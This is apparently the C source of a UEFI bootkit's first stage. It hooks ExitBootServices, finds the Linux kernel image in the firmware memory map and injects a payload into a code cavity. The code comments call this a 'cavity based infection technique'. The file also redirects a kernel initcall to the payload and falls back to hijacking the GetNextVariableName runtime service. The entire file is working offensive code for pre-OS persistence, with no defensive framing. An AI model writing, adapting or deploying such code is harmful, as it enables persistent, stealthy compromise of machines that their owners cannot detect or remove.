/* UEFI ExitBootServices hook to patch the kernel.
 * Need to check how well this works with memory protection, as we are writing
 * to our own segement.
 */
#include <efi.h>
#include <efilib.h>
#include "../stage2/export.h"

#define PAGE_SIZE 4096


void _stage1_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable);

// provided by the linker, have to access the value this way.
extern const uintptr_t load_offset __attribute__((visibility("hidden")));
EFI_PHYSICAL_ADDRESS LOAD_OFFSET = (EFI_PHYSICAL_ADDRESS)&load_offset;

extern const uintptr_t _initcall_offset __attribute__((visibility("hidden")));
EFI_PHYSICAL_ADDRESS initcall_offset = (EFI_PHYSICAL_ADDRESS)&_initcall_offset;

extern const uintptr_t _skip_direct_patching __attribute__((visibility("hidden")));
UINT64 skip_direct_patching = (UINT64)&_skip_direct_patching;

extern const uintptr_t _check_value __attribute__((visibility("hidden")));
UINT64 check_value = (UINT64)&_check_value;

extern const uintptr_t _check_value_offset __attribute__((visibility("hidden")));
UINT64 check_value_offset = (UINT64)&_check_value_offset;


// Want it pre-initialized
EFI_EXIT_BOOT_SERVICES orig_exitbootservices = \
    (EFI_EXIT_BOOT_SERVICES) 0x41424344;
EFI_SYSTEM_TABLE *systable = (EFI_SYSTEM_TABLE *) 0x41424344;
EFI_BOOT_SERVICES *bootservices = (EFI_BOOT_SERVICES *) 0x41424344;
int called = 0;


void *memcpy(void *dest, const void *src, int n)
{
    char *d = (char *)dest;
    char *s = (char *)src;
    for (int i = 0; i < n; i++) {
        d[i] = s[i];
    }
    return dest;
}


/* Check if this mapping is what we are looking for */
int check_address(void *addr, UINT64 pc)
{
    UINT64 *to_test = addr + check_value_offset;

    // extra page just to ensure we don't go OOB
    if (((pc + 1) * PAGE_SIZE) < check_value_offset) return 1;

    // check against a constant that should be at this offset.
    return (*to_test == check_value);
}

/* Apply our kernel patches */
void apply_patch(void *addr)
{
    // Copy our payload in.
    memcpy(
        addr + LOAD_OFFSET,
        runtime_bin + runtime_bin_offset,
        runtime_bin_len - runtime_bin_offset
    );

    // Hook our target initcall.
    UINT32 *target = addr + initcall_offset;
    *target = (UINT32) (LOAD_OFFSET - initcall_offset);
}


/* This is a cavity based infection technique, that works well for >6.6 kernels
 */
int try_direct_patching()
{
    int res = 0;
    // Lets get the memory map
    UINTN mapsize = 0, mapkey, descriptorsize;
    EFI_MEMORY_DESCRIPTOR *map = NULL;
    UINT32 descriptorversion;

    bootservices->GetMemoryMap(
        &mapsize,
        map,
        &mapkey,
        &descriptorsize,
        &descriptorversion
    );

    mapsize = mapsize + descriptorsize * 10;
    bootservices->AllocatePool(
        EfiBootServicesData,
        mapsize,
        (void **)&map
    );

    bootservices->GetMemoryMap(
        &mapsize,
        map,
        &mapkey,
        &descriptorsize,
        &descriptorversion
    );

    int count = mapsize / descriptorsize;
    /* Now we have the memory map, lets hunt */
    for (int i = 0; i < count; i++) {
        EFI_MEMORY_DESCRIPTOR *curr = \
            (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)map + i * descriptorsize);

        if (curr->Type != EfiLoaderCode) {
            continue;
        }

        if (check_address((void *)curr->PhysicalStart, curr->NumberOfPages)) {
            apply_patch((void *) curr->PhysicalStart);
            res = 1;
            break;
        }
    }

    if (map != NULL) {
        bootservices->FreePool(&map);
    }

    return res;
}


void install_runtime_hook()
{
    char *data = NULL;
    EFI_STATUS status = bootservices->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesCode,
        0x300,
        (EFI_PHYSICAL_ADDRESS *) &data
    );

    if (status != EFI_SUCCESS) {
        while (1) {}
    }

    /* Installing a runtime services hook */
    memcpy(data, runtime_bin, runtime_bin_len);
    /* Copy a few pointers */
    /* -> The function we are hooking */
    memcpy(data, (void *) &(systable->RuntimeServices->GetNextVariableName), 8);

    /* -> Address of the field in the struct we replace */
    UINT64 a = (UINT64) &(systable->RuntimeServices->GetNextVariableName);
    memcpy(data+8, (void *) &(a), 8);

    /* And hook! */
    systable->RuntimeServices->GetNextVariableName = \
        (EFI_GET_NEXT_VARIABLE_NAME) data + 16;
}


EFI_STATUS exit_bootservices_hook(EFI_HANDLE ImageHandle, UINTN MapKey)
{
    /* We are changing the memory map, so the kernel will end up calling
     * ExitBootSerivces() twice, so we need to avoid issues here.
     * see:
     * https://elixir.bootlin.com/linux/v6.10.10/source/drivers/firmware/efi/libstub/efi-stub-helper.c#L450
     */
    if (called == 1) {
        goto done;
    }
    called = 1;

    if (!skip_direct_patching) {
        if (try_direct_patching())
            goto done;
    }
    install_runtime_hook();

done:
    EFI_STATUS ret = orig_exitbootservices(ImageHandle, MapKey);

    return ret;
}


__attribute__ ((section(".text.start")))
void _stage1_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    /* Gotta do relocation */
    runtime_bin = ((unsigned long)&runtime_bin + runtime_bin);

    bootservices = SystemTable->BootServices;
    systable = SystemTable;

    orig_exitbootservices = bootservices->ExitBootServices;
    bootservices->ExitBootServices = exit_bootservices_hook;
}
